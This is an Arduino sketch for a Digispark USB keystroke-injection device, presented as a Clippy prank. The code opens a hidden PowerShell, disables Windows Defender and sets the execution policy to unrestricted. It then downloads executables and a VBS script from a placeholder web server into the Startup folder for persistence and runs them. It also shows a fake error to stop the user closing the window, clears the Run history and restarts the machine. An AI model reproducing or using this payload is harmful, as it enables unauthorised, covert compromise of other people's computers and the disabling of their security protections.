/*

Digispark

Upload .ino to Digispark

Payload: clippy.exe

Decsription: Uses powershell to download payload in "startup" folder as to load on startup. User cannot stop payload as it will run in memory and Windows will not allow user to delete payload. Powershell executes "clippy.exe" and "clippy.vbs" as administrator from webserver. Disable Windows Defender as to not find payload. 

clippy.exe: Fun joke program creates an annoying Clippy/Clippit Office Assistant popup form Microsoft Word (version 97 to 2003). Popup every 60 sec created by http://rjlpranks.com/pranks/clippy/ 

clippy.vbs: Fake windows error to deter user from closing powershell. 

Created by Tyler Smith on 9/2/2019 at [TIME] - DataDucks.3utilities.com/forum (Forums) - DataDucks.Web.Development@gmail.com

Tested and refined by Tyler Smith on 9/8/2019 at [TIME]

Final Build on 9/8/2019 at 1:12 AM - Web Release on 9/8/2019 at [TIME]

Please see "clippy.txt" for list of phrases.

 */


 #include "DigiKeyboard.h"
 /* Init function */
    void setup() {
      // Don't need to set anything up to use DigiKeyboard
    }
    void loop() {
     // Turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
     pinMode(1, OUTPUT); //LED on Model A
     digitalWrite(1, HIGH);
     DigiKeyboard.delay(500);
     digitalWrite(1, LOW);
     DigiKeyboard.delay(100);
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN" again
     DigiKeyboard.delay(100);
     //DigiKeyboard.println(F("powershell")); // To see whats going on in powershell - uncomment to use WARNING: WILL NOT RUN ADMINISTRATOR MODE
     DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden - uncomment to use  
     DigiKeyboard.delay(2000);
     // Disable Windows Defender
      DigiKeyboard.println(F("Set-MpPreference -DisableRealtimeMonitoring $true"));
      DigiKeyboard.delay(100);
      DigiKeyboard.println(F("set-executionpolicy unrestricted")); // Unrestricted
      DigiKeyboard.delay(100);
      DigiKeyboard.println(F("Y")); // Accept
      DigiKeyboard.delay(100);
      // Execute code from the interwebs modify 000.0.0.0 with your IP address (192.168.0.0, 127.0.0.1, etc.)
      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;mkdir clippy;cd clippy;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\";Invoke-WebRequest \"http://000.0.0.0/clippy.vbs\" -OutFile \"clippy.vbs\""));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute clippy.exe
      DigiKeyboard.println(F("./clippy.exe"));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute clippy.txt
      DigiKeyboard.println(F("./clippy.vbs"));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(1000);
      // Clear run command history
      DigiKeyboard.println(F("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f"));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Led on
      digitalWrite(1, HIGH);
      // Restart computer payload will execute on startup ($StartupDir = [environment]::getfolderpath('Startup'))
      DigiKeyboard.println(F("Restart-Computer"));
  
      while(true){
        //do nothing
      }
    }
